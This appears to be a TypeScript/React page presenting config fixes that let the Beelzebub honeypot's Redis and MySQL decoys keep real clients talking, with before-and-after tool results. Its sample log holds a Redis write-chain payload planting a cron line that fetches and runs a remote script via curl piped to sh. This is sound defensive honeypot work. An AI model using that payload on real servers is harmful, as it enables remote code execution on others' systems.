import { z } from "zod";
import recorded from "../data/redis.json";

const REDIS_BRANCH = "https://github.com/cherylaurelia/beelzebub/tree/fix/redis-resp-decoy";
const CHAIN_BRANCH = "https://github.com/cherylaurelia/beelzebub/tree/fix/redis-write-chain";
const MYSQL_BRANCH = "https://github.com/cherylaurelia/beelzebub/tree/fix/mysql-greeting";
const DEMO_REPO = "https://github.com/cherylaurelia/beelzebub-demo";
const EARLIER_PR = "https://github.com/beelzebub-labs/beelzebub/pull/290";
const PROJECT = "https://github.com/beelzebub-labs/beelzebub";

const stepSchema = z.object({
  cmd: z.string(),
  status: z.enum(["ok", "hang"]),
  seconds: z.number(),
  output: z.string(),
});

const runsSchema = z.object({
  before: z.array(stepSchema),
  hang_fix: z.array(stepSchema),
  write_chain: z.array(stepSchema),
  control: z.array(stepSchema),
});

type Step = z.infer<typeof stepSchema>;

const runs = runsSchema.parse(recorded);

const beforeLog = String.raw`{"Description":"Redis 7.0.12","Handler":"not_found",
 "Command":"*1\r\n$4\r\nPING","CommandOutput":""}`;

const afterLog = String.raw`{"Description":"Redis 7.0.12","Handler":"write",
 "Command":"*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$52\r\n\n\n*/1 * * * * curl -s http://203.0.113.9/a.sh | sh",
 "CommandOutput":"+OK\r\n"}`;

const toolResults = [
  { tool: "nmap -sV, port 6379", before: "redis? (guessed from the port)", after: "Redis key-value store 7.0.12" },
  { tool: "nmap redis-info script", before: "Script execution failed", after: "reads version, OS, clients" },
  { tool: "redis-py 8.1", before: "TimeoutError on connect, 48 s", after: "connects; ping and info work" },
  { tool: "hydra redis", before: "no result, killed at 20 s", after: "reports no password required" },
];

const mysqlResults = [
  {
    tool: "mysql client",
    before: "ERROR 2013 Lost connection, reading initial communication packet",
    after: "ERROR 1045 Access denied",
  },
  { tool: "PyMySQL", before: "Packet sequence number wrong", after: "OperationalError 1045" },
  { tool: "hydra mysql", before: '"protocol version 50", killed at 20 s', after: "finishes, 0 valid" },
  { tool: "nmap -sV, port 3306", before: "mysql? (guessed from the port)", after: "MySQL 8.0.29" },
  { tool: "Username in the log", before: "none: the client never sends one", after: "backup_admin, root, svc_app" },
];

function replyText(step: Step | undefined) {
  if (step === undefined) {
    return "no run";
  }

  if (step.status === "hang") {
    return "hang";
  }

  if (step.output === "") {
    return "(empty list)";
  }

  return step.output.endsWith("configurati") ? `${step.output}…` : step.output;
}

function replyTone(step: Step | undefined) {
  if (step?.status === "hang") {
    return "text-bad";
  }

  return step?.output.startsWith("ERR") ? "text-soft" : "text-good";
}

function Cell({ step }: { step: Step | undefined }) {
  return <td className={`px-3 py-2 ${replyTone(step)}`}>{replyText(step)}</td>;
}

function PhoneRow({ label, step }: { label: string; step: Step | undefined }) {
  return (
    <div className="flex gap-3">
      <dt className="w-24 shrink-0 text-muted">{label}</dt>
      <dd className={`min-w-0 ${replyTone(step)}`}>{replyText(step)}</dd>
    </div>
  );
}

function ToolTable({ rows, caption }: { rows: { tool: string; before: string; after: string }[]; caption: string }) {
  return (
    <div className="overflow-x-auto rounded-lg border border-line bg-panel" tabIndex={0} role="region" aria-label={caption}>
      <table className="w-full min-w-[340px] text-left font-mono text-xs sm:text-sm">
        <caption className="sr-only">{caption}</caption>
        <thead className="text-muted">
          <tr>
            <th scope="col" className="px-3 py-2 font-normal">Real tool</th>
            <th scope="col" className="px-3 py-2 font-normal">Shipped</th>
            <th scope="col" className="px-3 py-2 font-normal">Fix</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((row) => (
            <tr key={row.tool} className="border-t border-line">
              <td className="px-3 py-2 text-soft">{row.tool}</td>
              <td className="px-3 py-2 text-bad">{row.before}</td>
              <td className="px-3 py-2 text-good">{row.after}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

export default function Page() {
  return (
    <main className="mx-auto max-w-4xl px-5 py-12">
      <p className="font-mono text-sm text-accent">Beelzebub decoys vs real clients</p>
      <h1 className="mt-3 font-display text-3xl font-bold leading-tight sm:text-4xl">
        redis-cli hangs and mysql fails at the greeting against two shipped decoys, so the tool stops before the attack happens.
      </h1>
      <p className="mt-4 text-lg text-soft">
        Config-only changes keep the session going: the Redis decoy answers real RESP requests, a separate branch answers the usual write chain, and the MySQL decoy sends a real greeting and logs the login.
      </p>
      <div className="mt-6 flex flex-wrap gap-3 font-mono text-sm">
        <a className="rounded bg-accent px-4 py-2 font-semibold text-bg" href={REDIS_BRANCH}>Redis hang fix</a>
        <a className="rounded border border-accent px-4 py-2 text-accent" href={CHAIN_BRANCH}>Write-chain branch</a>
        <a className="rounded border border-accent px-4 py-2 text-accent" href={MYSQL_BRANCH}>MySQL fix branch</a>
        <a className="rounded border border-line px-4 py-2 text-soft" href={DEMO_REPO}>Demo repo and recorded runs</a>
      </div>

      <p className="mt-4 text-sm text-muted">
        These are branches, not open PRs: CONTRIBUTING asks contributors to have authored 100% of the content, and these were written with Claude Code. Take them or ignore them.
      </p>

      <section className="mt-12">
        <h2 className="font-display text-2xl font-semibold">Redis: a write chain, four ways</h2>
        <p className="mt-2 text-soft">
          Real <code className="font-mono text-sm">redis-cli</code> against <code className="font-mono text-sm">tcp-6379-redis.yaml</code> on main, on each fix branch, and against a real <code className="font-mono text-sm">redis:7.0.12</code> in Docker as the control. &quot;hang&quot; means no reply, killed at 8 s. Each command ran on its own connection so all ten could be timed; a real tool would stop at the first hang.
        </p>
        <div className="mt-4 hidden overflow-x-auto rounded-lg border border-line bg-panel sm:block" tabIndex={0} role="region" aria-label="Redis command results">
          <table className="w-full text-left font-mono text-xs">
            <caption className="sr-only">redis-cli results per command on four servers</caption>
            <thead className="text-muted">
              <tr>
                <th scope="col" className="px-3 py-2 font-normal">Command</th>
                <th scope="col" className="px-3 py-2 font-normal">Shipped</th>
                <th scope="col" className="px-3 py-2 font-normal">Hang fix</th>
                <th scope="col" className="px-3 py-2 font-normal">+ write chain</th>
                <th scope="col" className="px-3 py-2 font-normal">Real Redis 7.0.12</th>
              </tr>
            </thead>
            <tbody>
              {runs.before.map((step, i) => (
                <tr key={step.cmd} className="border-t border-line align-top">
                  <td className="px-3 py-2 text-soft">{step.cmd}</td>
                  <Cell step={step} />
                  <Cell step={runs.hang_fix[i]} />
                  <Cell step={runs.write_chain[i]} />
                  <Cell step={runs.control[i]} />
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <ul className="mt-4 space-y-3 font-mono text-xs sm:hidden">
          {runs.before.map((step, i) => (
            <li key={step.cmd} className="rounded-lg border border-line bg-panel p-3">
              <p className="break-words text-soft">{step.cmd}</p>
              <dl className="mt-2 space-y-1">
                <PhoneRow label="Shipped" step={step} />
                <PhoneRow label="Hang fix" step={runs.hang_fix[i]} />
                <PhoneRow label="+ chain" step={runs.write_chain[i]} />
                <PhoneRow label="Real Redis" step={runs.control[i]} />
              </dl>
            </li>
          ))}
        </ul>
        <p className="mt-4 text-soft">
          On one connection, with <code className="font-mono text-sm">redis-cli</code> running 11 commands from stdin: the shipped file logs 1 event and stalls, and each fix branch logs all 11. On the hang fix the writes get errors; on the write-chain branch the payload is accepted.
        </p>
        <p className="mt-3 text-sm text-muted">
          INFO shows its first line only. Real Redis 7 refuses both <code className="font-mono">CONFIG SET</code> lines by default. The write-chain branch says OK on purpose so the payload is recorded, which is a tell against a 7.0.12 banner, so whether that trade is wanted is your call.
        </p>
      </section>

      <section className="mt-10">
        <h2 className="font-display text-xl font-semibold">Why it hangs</h2>
        <ul className="mt-3 list-disc space-y-2 pl-5 text-soft">
          <li>Clients send <code className="font-mono text-sm">{String.raw`*1\r\n$4\r\nPING\r\n`}</code>. The rule is <code className="font-mono text-sm">^PING</code>, and the catch-all <code className="font-mono text-sm">^(.+)$</code> stops at the first newline, so nothing matches and no reply is written.</li>
          <li>The INFO handler said <code className="font-mono text-sm">$126</code> for a 124-byte body, because the length counted the closing CRLF. Clients kept waiting even once the rule matched.</li>
          <li>The integration test sends inline <code className="font-mono text-sm">{String.raw`PING\n`}</code>, so it stays green. The new test runs the shipped YAML with RESP, and fails on main.</li>
          <li><a className="text-accent underline" href={EARLIER_PR}>PR #290</a> by zgsec reported this hang in June with a Go change, closed once the TCP code moved on. This one needs no Go change: the Redis branch only edits the rules and replies.</li>
        </ul>
      </section>

      <section className="mt-10">
        <h2 className="font-display text-xl font-semibold">What the log gets</h2>
        <p className="mt-2 text-soft">The old decoy does log the first request, unmatched. The cron payload only arrives once the client gets replies it can continue from.</p>
        <div className="mt-3 grid gap-4">
          <figure className="min-w-0">
            <figcaption className="mb-1 font-mono text-sm text-bad">Shipped file: first request, no reply</figcaption>
            <pre tabIndex={0} className="overflow-x-auto rounded-lg border border-line bg-panel p-3 font-mono text-xs text-soft">{beforeLog}</pre>
          </figure>
          <figure className="min-w-0">
            <figcaption className="mb-1 font-mono text-sm text-good">Write-chain branch: the payload, named handler</figcaption>
            <pre tabIndex={0} className="overflow-x-auto rounded-lg border border-line bg-panel p-3 font-mono text-xs text-soft">{afterLog}</pre>
          </figure>
        </div>
        <p className="mt-2 text-sm text-muted">Both trimmed to the relevant fields. The IP is from the documentation range.</p>
        <div className="mt-4">
          <ToolTable rows={toolResults} caption="Other Redis tools" />
        </div>
      </section>

      <section className="mt-10">
        <h2 className="font-display text-2xl font-semibold">MySQL: from a text banner to a real greeting</h2>
        <p className="mt-2 text-soft">
          The banner was the text <code className="font-mono text-sm">8.0.29</code>. Clients parse that text as a MySQL packet, then give up before sending a username. This is a separate branch, to be reviewed after Redis. The log gets the username and scramble, not the password.
        </p>
        <div className="mt-4">
          <ToolTable rows={mysqlResults} caption="MySQL tool results" />
        </div>
      </section>

      <section className="mt-10">
        <h2 className="font-display text-xl font-semibold">What this doesn&apos;t show</h2>
        <ul className="mt-3 list-disc space-y-2 pl-5 text-soft">
          <li>Everything ran on loopback, with no real attacker traffic. Scanners that send inline Redis commands already get replies, and I have no number for how much traffic uses RESP.</li>
          <li>Redis pipelines stall: redis-py&apos;s 3-command pipeline got one reply and timed out on both branches. A value over about 4 KB gets extra replies, and a request split across TCP segments gets an error before its real reply. The bytes are logged in each case. A RESP framing mode would fix all three.</li>
          <li>The write-chain branch keeps no state: <code className="font-mono text-sm">GET</code> after <code className="font-mono text-sm">SET</code> returns an error, <code className="font-mono text-sm">KEYS</code> stays empty, the unknown-command error names no command, and <code className="font-mono text-sm">MODULE LOAD</code> isn&apos;t handled.</li>
          <li>The MySQL salt and thread ID are static, so two connections can spot them, and the greeting offers no TLS, which a real MySQL 8 normally does. The denial says <code className="font-mono text-sm">Access denied</code> with no user, because a static handler can&apos;t echo the name.</li>
          <li>Seen but not touched: <code className="font-mono text-sm">mosquitto_pub -q 1</code>, <code className="font-mono text-sm">ldapsearch</code> after the bind (credentials are already logged), and impacket&apos;s MSSQL and SMB clients. <code className="font-mono text-sm">serverVersion: OpenSSH</code> reads as a Linksys router to nmap.</li>
        </ul>
      </section>

      <footer className="mt-14 border-t border-line pt-5 text-sm text-muted">
        Unofficial demo by Cheryl Aurelia: not affiliated with Beelzebub. Tested against{" "}
        <a className="underline" href={PROJECT}>beelzebub-labs/beelzebub</a> main at df6de36, 2026-11-08. Written with Claude Code.
      </footer>
    </main>
  );
}
